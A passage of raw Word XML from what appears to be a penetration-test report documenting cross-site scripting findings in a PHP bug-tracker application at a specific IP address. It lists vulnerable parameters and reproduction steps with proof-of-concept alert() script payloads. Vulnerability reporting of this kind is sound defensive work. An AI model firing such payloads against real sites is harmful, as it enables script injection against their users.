                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> with 12 and 121.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Screenshot:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00DF1044" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4D5B7502" wp14:editId="3D1B5DE9">
                  <wp:extent cx="7245350" cy="38900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245350" cy="3890010"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00DF1044">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Fig 1. </w:t>
            </w:r>
            <w:r w:rsidR="00DF1044">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Cross Site Scripting</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3B99C19A" wp14:editId="346DCB7F">
                  <wp:extent cx="7245350" cy="38900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245350" cy="3890010"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00802CE3" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Fig 2</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Cross Site Scripting</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Instance2</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:hyperlink r:id="rId24" w:history="1">
              <w:r w:rsidRPr="0041513E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/bug_report_page.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00F62870">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00802CE3" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Vulnerable Parameter: </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Summary</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00802CE3" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00802CE3" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00802CE3" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>teps</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00802CE3" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="17"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Navigate to above URL and Enter </w:t>
            </w:r>
            <w:r w:rsidR="001C40ED">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>&lt;script&gt;alert`14</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">`&lt;/script&gt; in the </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:i/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Summary</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> input box.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="17"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Enter </w:t>
            </w:r>
            <w:r w:rsidR="009B6618">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>anything</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> in the </w:t>
            </w:r>
            <w:r w:rsidRPr="0041513E">
              <w:rPr>
                <w:i/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> textarea and Click on the </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:i/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Submit Report </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>button.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="17"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Navigate to URL </w:t>
            </w:r>
            <w:hyperlink r:id="rId25" w:history="1">
              <w:r w:rsidR="009B6618" w:rsidRPr="009B6618">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/my_view_page.php</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00DF1044" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="17"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Observe the popup messages </w:t>
            </w:r>
            <w:r w:rsidR="001C40ED">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>with 14</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00802CE3" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00802CE3" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Screenshot:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00802CE3" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00802CE3" w:rsidRDefault="001C40ED" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1E93968B" wp14:editId="67B10910">
                  <wp:extent cx="7245350" cy="38944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245350" cy="3894455"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00802CE3" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00802CE3" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRDefault="001C40ED" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Fig </w:t>
            </w:r>
            <w:r w:rsidR="00695917">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="0041513E" w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r w:rsidR="0041513E">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Cross Site Scripting</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRDefault="0041513E" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Instance3</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:hyperlink r:id="rId27" w:history="1">
              <w:r w:rsidR="00695917" w:rsidRPr="00147D31">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/adminbak/upgrade_unattended.php?db_type=%3Cscript%3Ealert%281%29%3C/script%3E</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="00695917" w:rsidRDefault="00695917" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="00802CE3" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Vulnerable Parameter: </w:t>
            </w:r>
            <w:r w:rsidR="00695917">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>db_type</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="00802CE3" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="00802CE3" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="00802CE3" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>teps</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="00802CE3" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="19"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Navigate to above URL.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="00DF1044" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="19"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Observe the popup messages </w:t>
            </w:r>
            <w:r w:rsidR="00695917">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>with 1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="00802CE3" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="00802CE3" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Screenshot:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="00802CE3" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="00802CE3" w:rsidRDefault="00DD6E60" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="63DD3C58" wp14:editId="6099DEB6">
                  <wp:extent cx="7245350" cy="38944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245350" cy="3894455"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="00802CE3" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="00802CE3" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Fig 1. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Cross Site Scripting</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRDefault="001C40ED" w:rsidP="0041513E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0041513E" w:rsidRPr="00802CE3" w:rsidRDefault="0041513E" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
